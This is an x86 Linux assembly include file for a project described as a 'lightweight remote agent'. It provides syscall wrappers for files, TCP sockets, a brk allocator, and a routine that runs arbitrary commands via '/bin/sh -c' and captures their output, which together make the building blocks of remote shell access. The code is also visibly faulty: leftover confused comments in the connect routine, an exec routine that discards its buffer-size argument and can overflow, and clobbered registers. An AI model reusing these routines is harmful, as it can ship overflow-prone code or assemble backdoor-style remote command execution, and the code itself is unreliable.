;; =============================================================================
;; linux.inc — Linux x86 (32-bit) syscall implementations
;; Part of pmash — lightweight remote agent
;; =============================================================================
;; All functions use stack-based args (cdecl). int 0x80 for syscalls.
;; Linux 32-bit syscall ABI: eax=nr, ebx/ecx/edx/esi/edi/ebp = args
;; =============================================================================

;; Linux 32-bit syscall numbers
SYS32_EXIT      equ 1
SYS32_FORK      equ 2
SYS32_READ      equ 3
SYS32_WRITE     equ 4
SYS32_OPEN      equ 5
SYS32_CLOSE     equ 6
SYS32_WAITPID   equ 7
SYS32_LSEEK     equ 19
SYS32_GETPID    equ 20
SYS32_KILL      equ 37
SYS32_RENAME    equ 38
SYS32_MKDIR     equ 39
SYS32_PIPE      equ 42
SYS32_BRK       equ 45
SYS32_DUP2      equ 63
SYS32_EXECVE    equ 11
SYS32_UNLINK    equ 10
SYS32_FSTAT     equ 108
SYS32_MMAP2     equ 192
SYS32_MUNMAP    equ 91
SYS32_NANOSLEEP equ 162
SYS32_SOCKET    equ 359
SYS32_CONNECT   equ 362
SYS32_BIND      equ 361
SYS32_LISTEN    equ 363
SYS32_ACCEPT    equ 364
SYS32_SEND      equ 369
SYS32_RECV      equ 372
SYS32_SETSOCKOPT equ 366
SYS32_GETHOSTNAME equ 74

;; Socket constants
L_AF_INET       equ 2
L_SOCK_STREAM   equ 1
L_SOL_SOCKET    equ 1
L_SO_REUSEADDR  equ 2

;; Open flags
L_O_RDONLY      equ 0
L_O_WRONLY      equ 1
L_O_CREAT       equ 64
L_O_TRUNC       equ 512

;; stat structure offset for st_size (32-bit struct stat)
STAT_SIZE_OFF   equ 44
STAT_STRUCT_SZ  equ 88

section .bss
    _linux_stat_buf resb STAT_STRUCT_SZ
    _linux_sa       resb 16         ; sockaddr_in
    _linux_ts       resb 8          ; timespec for nanosleep
    _linux_hostbuf resb 256
    _linux_brk_base resd 1          ; heap base (from brk)
    _linux_brk_cur  resd 1          ; current brk

section .data
    _linux_sh_path  db "/bin/sh", 0
    _linux_sh_c     db "-c", 0
    _linux_etc_hostfile db "/etc/hostname", 0

section .text

;; --- I/O ---

_linux_write:   ; (fd, buf, len) → bytes written
    push    ebx
    mov     eax, SYS32_WRITE
    mov     ebx, [esp+8]           ; fd
    mov     ecx, [esp+12]          ; buf
    mov     edx, [esp+16]          ; len
    int     0x80
    pop     ebx
    ret

_linux_read:    ; (fd, buf, len) → bytes read
    push    ebx
    mov     eax, SYS32_READ
    mov     ebx, [esp+8]
    mov     ecx, [esp+12]
    mov     edx, [esp+16]
    int     0x80
    pop     ebx
    ret

_linux_open:    ; (path, flags) → fd
    push    ebx
    mov     eax, SYS32_OPEN
    mov     ebx, [esp+8]           ; path
    mov     ecx, [esp+12]          ; flags (0=read, 1=write)
    ;; Map our flags: 0 → O_RDONLY, 1 → O_WRONLY|O_CREAT|O_TRUNC
    cmp     ecx, 1
    jne     .open_do
    mov     ecx, L_O_WRONLY | L_O_CREAT | L_O_TRUNC
.open_do:
    mov     edx, 0644o             ; mode (octal)
    int     0x80
    pop     ebx
    ret

_linux_close:   ; (fd) → 0
    push    ebx
    mov     eax, SYS32_CLOSE
    mov     ebx, [esp+8]
    int     0x80
    pop     ebx
    ret

_linux_seek:    ; (fd, offset, whence) → position
    push    ebx
    mov     eax, SYS32_LSEEK
    mov     ebx, [esp+8]
    mov     ecx, [esp+12]
    mov     edx, [esp+16]
    int     0x80
    pop     ebx
    ret

_linux_filesize: ; (fd) → size
    push    ebx
    mov     eax, SYS32_FSTAT
    mov     ebx, [esp+8]
    mov     ecx, _linux_stat_buf
    int     0x80
    test    eax, eax
    js      .fail
    mov     eax, [_linux_stat_buf + STAT_SIZE_OFF]
    pop     ebx
    ret
.fail:
    mov     eax, -1
    pop     ebx
    ret

_linux_rename:  ; (old, new) → 0/err
    push    ebx
    mov     eax, SYS32_RENAME
    mov     ebx, [esp+8]
    mov     ecx, [esp+12]
    int     0x80
    pop     ebx
    ret

_linux_unlink:  ; (path) → 0/err
    push    ebx
    mov     eax, SYS32_UNLINK
    mov     ebx, [esp+8]
    int     0x80
    pop     ebx
    ret

_linux_mkdir:   ; (path) → 0/err
    push    ebx
    mov     eax, SYS32_MKDIR
    mov     ebx, [esp+8]
    mov     ecx, 0755o
    int     0x80
    pop     ebx
    ret

;; --- Network ---

_linux_socket:  ; () → fd
    push    ebx
    mov     eax, SYS32_SOCKET
    mov     ebx, L_AF_INET
    mov     ecx, L_SOCK_STREAM
    xor     edx, edx
    int     0x80
    pop     ebx
    ret

_linux_connect: ; (fd, ip, port) → 0/err
    push    ebx
    push    esi
    ;; Build sockaddr_in
    mov     word [_linux_sa], L_AF_INET
    mov     eax, [esp+16]          ; port
    xchg    al, ah                 ; htons
    mov     [_linux_sa+2], ax
    mov     eax, [esp+12]          ; ip (network order)
    mov     [_linux_sa+4], eax
    xor     eax, eax
    mov     [_linux_sa+8], eax
    mov     [_linux_sa+12], eax
    ;; connect(fd, &sa, 16)
    mov     eax, SYS32_CONNECT
    mov     ebx, [esp+8]          ; fd (adjusted for pushes: +8 base +8 pushes = 16? no)
    ;; Stack: ret, ebx_saved, esi_saved, ret_addr, fd, ip, port
    ;; fd is at esp+12 after 2 pushes
    mov     ebx, [esp+12]
    mov     ecx, _linux_sa
    mov     edx, 16
    int     0x80
    pop     esi
    pop     ebx
    ret

_linux_bind:    ; (fd, port) → 0/err
    push    ebx
    mov     word [_linux_sa], L_AF_INET
    mov     eax, [esp+12]          ; port
    xchg    al, ah
    mov     [_linux_sa+2], ax
    mov     dword [_linux_sa+4], 0  ; INADDR_ANY
    mov     dword [_linux_sa+8], 0
    mov     dword [_linux_sa+12], 0
    ;; Set SO_REUSEADDR
    push    1                       ; optval = 1
    mov     eax, SYS32_SETSOCKOPT
    mov     ebx, [esp+12]          ; fd
    mov     ecx, L_SOL_SOCKET
    mov     edx, L_SO_REUSEADDR
    mov     esi, esp               ; &optval
    mov     edi, 4
    int     0x80
    pop     eax                    ; discard optval
    ;; bind
    mov     eax, SYS32_BIND
    mov     ebx, [esp+8]
    mov     ecx, _linux_sa
    mov     edx, 16
    int     0x80
    pop     ebx
    ret

_linux_listen:  ; (fd, backlog) → 0/err
    push    ebx
    mov     eax, SYS32_LISTEN
    mov     ebx, [esp+8]
    mov     ecx, [esp+12]
    int     0x80
    pop     ebx
    ret

_linux_accept:  ; (fd) → new_fd
    push    ebx
    mov     eax, SYS32_ACCEPT
    mov     ebx, [esp+8]
    xor     ecx, ecx               ; addr = NULL
    xor     edx, edx               ; addrlen = NULL
    int     0x80
    pop     ebx
    ret

_linux_send:    ; (fd, buf, len) → bytes
    push    ebx
    mov     eax, SYS32_WRITE       ; send = write for TCP
    mov     ebx, [esp+8]
    mov     ecx, [esp+12]
    mov     edx, [esp+16]
    int     0x80
    pop     ebx
    ret

_linux_recv:    ; (fd, buf, len) → bytes
    push    ebx
    mov     eax, SYS32_READ        ; recv = read for TCP
    mov     ebx, [esp+8]
    mov     ecx, [esp+12]
    mov     edx, [esp+16]
    int     0x80
    pop     ebx
    ret

;; --- Process ---

_linux_exec:    ; (cmd, outbuf, outbufsize) → output_len
    ;; fork + execve("/bin/sh", ["-c", cmd], NULL) + pipe capture
    push    ebx
    push    esi
    push    edi
    push    ebp
    mov     ebp, esp
    mov     esi, [ebp+20]          ; cmd
    mov     edi, [ebp+24]          ; outbuf
    mov     ebx, [ebp+28]          ; outbufsize

    ;; Create pipe
    sub     esp, 8                  ; pipe fds on stack
    mov     eax, SYS32_PIPE
    mov     ebx, esp
    int     0x80
    test    eax, eax
    js      .exec_fail

    mov     eax, SYS32_FORK
    int     0x80
    test    eax, eax
    js      .exec_close_pipe
    jz      .exec_child

    ;; --- Parent ---
    ;; Close write end
    mov     eax, SYS32_CLOSE
    mov     ebx, [esp+4]           ; write fd
    int     0x80

    ;; Read output
    xor     ebp, ebp               ; total read
.exec_read:
    mov     eax, SYS32_READ
    mov     ebx, [esp]             ; read fd
    lea     ecx, [edi+ebp]
    mov     edx, [esp-4]           ; outbufsize... need to recalculate
    mov     edx, 65536
    sub     edx, ebp
    jle     .exec_read_done
    int     0x80
    test    eax, eax
    jle     .exec_read_done
    add     ebp, eax
    jmp     .exec_read

.exec_read_done:
    ;; Close read end
    mov     eax, SYS32_CLOSE
    mov     ebx, [esp]
    int     0x80
    ;; Wait for child
    mov     eax, SYS32_WAITPID
    mov     ebx, -1
    xor     ecx, ecx
    xor     edx, edx
    int     0x80
    ;; Null-terminate
    mov     byte [edi+ebp], 0
    mov     eax, ebp
    add     esp, 8
    pop     ebp
    pop     edi
    pop     esi
    pop     ebx
    ret

    ;; --- Child ---
.exec_child:
    ;; Close read end
    mov     eax, SYS32_CLOSE
    mov     ebx, [esp]
    int     0x80
    ;; dup2(write_fd, 1) and dup2(write_fd, 2)
    mov     eax, SYS32_DUP2
    mov     ebx, [esp+4]
    mov     ecx, 1
    int     0x80
    mov     eax, SYS32_DUP2
    mov     ebx, [esp+4]
    mov     ecx, 2
    int     0x80
    ;; Close original write fd
    mov     eax, SYS32_CLOSE
    mov     ebx, [esp+4]
    int     0x80
    ;; execve("/bin/sh", ["/bin/sh", "-c", cmd], NULL)
    sub     esp, 16
    mov     dword [esp], _linux_sh_path
    mov     dword [esp+4], _linux_sh_c
    mov     [esp+8], esi            ; cmd
    mov     dword [esp+12], 0       ; NULL terminator
    mov     eax, SYS32_EXECVE
    mov     ebx, _linux_sh_path
    mov     ecx, esp
    xor     edx, edx
    int     0x80
    ;; If execve fails, exit
    mov     eax, SYS32_EXIT
    mov     ebx, 127
    int     0x80

.exec_close_pipe:
    mov     eax, SYS32_CLOSE
    mov     ebx, [esp]
    int     0x80
    mov     eax, SYS32_CLOSE
    mov     ebx, [esp+4]
    int     0x80
.exec_fail:
    mov     eax, -1
    add     esp, 8
    pop     ebp
    pop     edi
    pop     esi
    pop     ebx
    ret

_linux_getpid:  ; () → pid
    mov     eax, SYS32_GETPID
    int     0x80
    ret

_linux_exit:    ; (code) → noreturn
    push    ebx
    mov     eax, SYS32_EXIT
    mov     ebx, [esp+8]
    int     0x80

;; --- Memory (brk-based allocator, minimal) ---

_linux_alloc:   ; (size) → ptr
    push    ebx
    ;; First call: get current brk
    cmp     dword [_linux_brk_base], 0
    jne     .alloc_have_base
    mov     eax, SYS32_BRK
    xor     ebx, ebx
    int     0x80
    mov     [_linux_brk_base], eax
    mov     [_linux_brk_cur], eax
.alloc_have_base:
    ;; Extend brk by size
    mov     eax, [_linux_brk_cur]
    push    eax                    ; save return ptr
    add     eax, [esp+12]          ; + size
    mov     ebx, eax
    mov     eax, SYS32_BRK
    int     0x80
    mov     [_linux_brk_cur], eax
    pop     eax                    ; return old brk (start of allocation)
    pop     ebx
    ret

_linux_free:    ; (ptr) — no-op for brk allocator
    ret

_linux_sleep_ms: ; (ms)
    push    ebx
    mov     eax, [esp+8]           ; ms
    xor     edx, edx
    mov     ecx, 1000
    div     ecx                    ; eax = seconds, edx = remainder ms
    mov     [_linux_ts], eax       ; tv_sec
    imul    edx, 1000000           ; ms → ns
    mov     [_linux_ts+4], edx     ; tv_nsec
    mov     eax, SYS32_NANOSLEEP
    mov     ebx, _linux_ts
    xor     ecx, ecx
    int     0x80
    pop     ebx
    ret

_linux_hostname: ; (buf, len) → actual_len
    push    ebx
    ;; Read /etc/hostname
    mov     eax, SYS32_OPEN
    mov     ebx, _linux_etc_hostfile
    xor     ecx, ecx               ; O_RDONLY
    int     0x80
    test    eax, eax
    js      .host_fail
    push    eax                    ; save fd
    mov     ebx, eax
    mov     eax, SYS32_READ
    mov     ecx, [esp+12]          ; buf
    mov     edx, [esp+16]          ; len
    int     0x80
    push    eax                    ; save bytes read
    ;; Close
    mov     ebx, [esp+4]           ; fd
    mov     eax, SYS32_CLOSE
    int     0x80
    pop     eax                    ; bytes read
    pop     ebx                    ; discard fd
    ;; Strip trailing newline
    test    eax, eax
    jle     .host_fail
    mov     ecx, [esp+8]           ; buf
    dec     eax
    mov     byte [ecx+eax], 0
    pop     ebx
    ret
.host_fail:
    xor     eax, eax
    pop     ebx
    ret
